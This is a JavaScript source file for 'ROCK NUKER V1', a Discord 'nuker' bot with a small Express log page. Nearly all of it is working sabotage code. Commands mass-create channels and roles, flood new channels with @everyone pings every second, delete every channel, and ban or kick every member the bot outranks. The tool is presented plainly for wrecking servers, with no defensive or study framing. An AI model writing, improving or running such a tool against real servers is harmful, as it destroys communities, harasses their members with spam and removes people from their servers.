process.noDeprecation = true;

/**
 * ROCK NUKER V1
 * @author zenithsenpai
 */

const express = require("express");
const path = require("path");
const { Client, Intents, MessageEmbed } = require("discord.js");
const nuker = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
const { token, prefix, userID } = require("../config/config.json");

const app = express();
const PORT = 3000;

let commandLogs = [];

// Static files (HTML, CSS)
app.use(express.static(path.join(__dirname, "public")));

// Serve the logs as an API endpoint
app.get("/api/logs", (req, res) => {
    res.json(commandLogs);
});

// Start the Express server
app.listen(PORT, () => {
    console.log(`Webserver running on http://localhost:${PORT}`);
});

// Discord bot functionality
nuker.on("ready", () => {
    console.clear();
    console.log(`Nuker: ${nuker.user.tag} | Prefix: ${prefix}`);
    console.log('Webpage: http://localhost:3000/logs.html');
    nuker.user.setActivity({ name: "ROCK NUKER V1", type: "PLAYING" });

    commandLogs.push(`Bot ${nuker.user.tag} is online.`);
});

app.use(express.json());

app.post("/api/status", (req, res) => {
    const { status, type } = req.body;
    if (status && type) {
        // Update the bot's status dynamically
        nuker.user.setActivity({ name: status, type });
        commandLogs.push(`Bot status updated to: ${type} ${status}`);
        res.status(200).send("Status updated");
    } else {
        res.status(400).send("Invalid input");
    }
});

nuker.on("messageCreate", async (message) => {
    if (!message.guild || message.author.bot) return;

    // Restrict to specified user ID
    if (message.author.id !== userID) {
        return message.reply("You are not authorized to use these commands.");
    }

    // Help Embed
    const help = new MessageEmbed()
        .setDescription(`**ROCK NUKER V1 ;**
        \n**mass channels ;**
        ${prefix}mc [amount] (text) i.e \`${prefix}mc 5 test\`\n
        **mass channel n ping ;**
        ${prefix}cp [amount] (text), {message} i.e \`${prefix}cp 5 test, testing\`\n
        **mass roles ;**
        ${prefix}mr [amount] (text) i.e \`${prefix}mr 5 test\`\n
        **delete channels ;**
        ${prefix}dc\n
        **mass kick ;**
        ${prefix}mk\n
        **mass ban ;**
        ${prefix}mb
        `)
        .setFooter(`© ROCK NUKER V1`)
        .setColor(0x36393E)
        .setTimestamp(Date.now());

    const hasPerms = (perm) => message.guild.members.me.permissions.has(perm || "ADMINISTRATOR");
    const channelPerms = hasPerms("MANAGE_CHANNELS");
    const banPerms = hasPerms("BAN_MEMBERS");
    const kickPerms = hasPerms("KICK_MEMBERS");
    const rolePerms = hasPerms("MANAGE_ROLES");

    const args = message.content.split(" ").slice(1);
    const args1 = args[0];
    const args2 = args.slice(1).join(" ");
    const args3 = args.slice(2).join(", ");

    // Help Command
    if (message.content.startsWith(prefix + "help")) {
        commandLogs.push(`Help command used by ${message.author.tag}`);
        return message.channel.send({ embeds: [help] });
    }

    // Mass Channels
    if (message.content.startsWith(prefix + "mc")) {
        commandLogs.push(`Mass Channels: ${args1} by ${message.author.tag}`);
        return MassChannels(args1, args2, message, channelPerms);
    }

    // Delete all Channels
    if (message.content.startsWith(prefix + "dc")) {
        commandLogs.push(`Delete Channels by ${message.author.tag}`);
        return DelAllChannels(message, channelPerms);
    }

    // Mass Channels and Ping
    if (message.content.startsWith(prefix + "cp")) {
        commandLogs.push(`Mass Channels and Ping: ${args1}, Message: ${args3} by ${message.author.tag}`);
        return MassChnPing(args1, args2, args3, message, channelPerms);
    }

    // Mass Roles
    if (message.content.startsWith(prefix + "mr")) {
        commandLogs.push(`Mass Roles: ${args1} by ${message.author.tag}`);
        return MassRoles(args1, args2, message, rolePerms);
    }

    // Mass Ban
    if (message.content.startsWith(prefix + "mb")) {
        commandLogs.push(`Mass Ban by ${message.author.tag}`);
        return BanAll(message, banPerms);
    }

    // Mass Kick
    if (message.content.startsWith(prefix + "mk")) {
        commandLogs.push(`Mass Kick by ${message.author.tag}`);
        return KickAll(message, kickPerms);
    }
});

// Nuking Functions
async function MassChannels(amount, channelName, message, channelPerms) {
    if (!amount || isNaN(amount)) return message.reply("Specify a valid number for channels.");
    if (amount > 500) return message.reply("Max limit is 500 channels.");
    if (!channelPerms) return message.reply("Missing Permissions: 'MANAGE_CHANNELS'");

    for (let i = 0; i < amount; i++) {
        if (message.guild.channels.cache.size === 500) break;
        await message.guild.channels.create(channelName || `${message.author.username} was here`, { type: "GUILD_TEXT" });
    }
}

async function MassChnPing(amount, channelName, pingMessage, message, channelPerms) {
    if (!amount || isNaN(amount)) return message.reply("Specify a valid number for channels.");
    if (!pingMessage) return message.reply("Provide a message for pinging.");
    if (amount > 500) return message.reply("Max limit is 500 channels.");
    if (!channelPerms) return message.reply("Missing Permissions: 'MANAGE_CHANNELS'");

    for (let i = 0; i < amount; i++) {
        if (message.guild.channels.cache.size === 500) break;
        const ch = await message.guild.channels.create(channelName || `${message.author.username} was here`, { type: "GUILD_TEXT" });
        setInterval(() => ch.send("@everyone " + pingMessage), 1000);
    }
}

async function DelAllChannels(message, channelPerms) {
    if (!channelPerms) return message.reply("Missing Permissions: 'MANAGE_CHANNELS'");
    message.guild.channels.cache.forEach(async (ch) => await ch.delete());
}

async function MassRoles(amount, roleName, message, rolePerms) {
    if (!amount || isNaN(amount)) return message.reply("Specify a valid number for roles.");
    if (!rolePerms) return message.reply("Missing Permissions: 'MANAGE_ROLES'");

    for (let i = 0; i < amount; i++) {
        await message.guild.roles.create({ name: roleName || "nuked", color: "RANDOM" });
    }
}

async function BanAll(message, banPerms) {
    if (!banPerms) return message.reply("Missing Permissions: 'BAN_MEMBERS'");

    let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
    message.reply(`Found ${arrayOfIDs.length} users. Banning...`);
    
    arrayOfIDs.forEach(async (user) => {
        const member = message.guild.members.cache.get(user);

        // Skip the bot itself, the user with the specific user ID, and members with higher roles
        if (
            user === nuker.user.id || // Skip the bot itself
            user === userID || // Skip the specific user from config
            member.roles.highest.position >= message.guild.members.me.roles.highest.position // Skip users with higher/equal role than the bot
        ) {
            const skipLog = `Skipping ban for ${member.user.tag}`;
            console.log(skipLog);
            commandLogs.push(skipLog); // Log skipped users
            return;
        }

        try {
            await member.ban();
            const successLog = `Successfully banned ${member.user.tag}`;
            console.log(successLog);
            commandLogs.push(successLog); // Log successfully banned users
        } catch (err) {
            console.error(`Failed to ban ${member.user.tag}:`, err);
        }
    });
}

async function KickAll(message, kickPerms) {
    if (!kickPerms) return message.reply("Missing Permissions: 'KICK_MEMBERS'");

    let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
    message.reply(`Found ${arrayOfIDs.length} users. Kicking...`);

    arrayOfIDs.forEach(async (user) => {
        const member = message.guild.members.cache.get(user);

        // Skip the bot itself, the user with the specific user ID, and members with higher roles
        if (
            user === nuker.user.id || // Skip the bot itself
            user === userID || // Skip the specific user from config
            member.roles.highest.position >= message.guild.members.me.roles.highest.position // Skip users with higher/equal role than the bot
        ) {
            const skipLog = `Skipping kick for ${member.user.tag}`;
            console.log(skipLog);
            commandLogs.push(skipLog); // Log skipped users
            return;
        }

        try {
            await member.kick();
            const successLog = `Successfully kicked ${member.user.tag}`;
            console.log(successLog);
            commandLogs.push(successLog); // Log successfully kicked users
        } catch (err) {
            console.error(`Failed to kick ${member.user.tag}:`, err);
        }
    });
}


// Crash Handler
process.on("unhandledRejection", (error) => console.error("Unhandled promise rejection:", error));
process.on("uncaughtException", (error) => console.error("Uncaught exception:", error));

try {
    nuker.login(token);
} catch (err) {
    console.error("Login failed:", err);
}
